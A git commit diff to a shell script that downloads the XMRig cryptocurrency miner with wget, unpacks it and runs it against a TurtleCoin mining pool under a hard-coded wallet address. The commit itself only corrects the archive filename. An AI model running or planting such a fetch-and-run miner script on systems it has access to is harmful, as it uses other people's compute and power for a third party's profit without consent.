d4bb81050ab4c7be9f7ba9bb30fa3c5da87151e3
izabelcristina <86168544+izabelcristina@users.noreply.github.com>
2021-06-19 17:37:49 -0300

    Update script.sh

--- script.sh
+++ script.sh
@@ -1,5 +1,5 @@
 #!/bin/sh
 wget 'https://github.com/xmrig/xmrig/releases/download/v6.7.2/xmrig-6.7.2-linux-x64.tar.gz'
-tar -xf xmrig-6.7.2-linux-x64.tar.gz.6
+tar -xf xmrig-6.7.2-linux-x64.tar.gz
 cd xmrig-6.7.2  
 ./xmrig -o turtlecoin.herominers.com:10381 -u TRTLv2Qhn1hfE8bpBBPxs2YtexmdU7MTXUqKeaoNCycNVXrvDHdudpsEJgG7DqqzdkJWvfqBdBNSgb42jgvCcXmYfMPmtPDqD2H  -a argon2/chukwav2
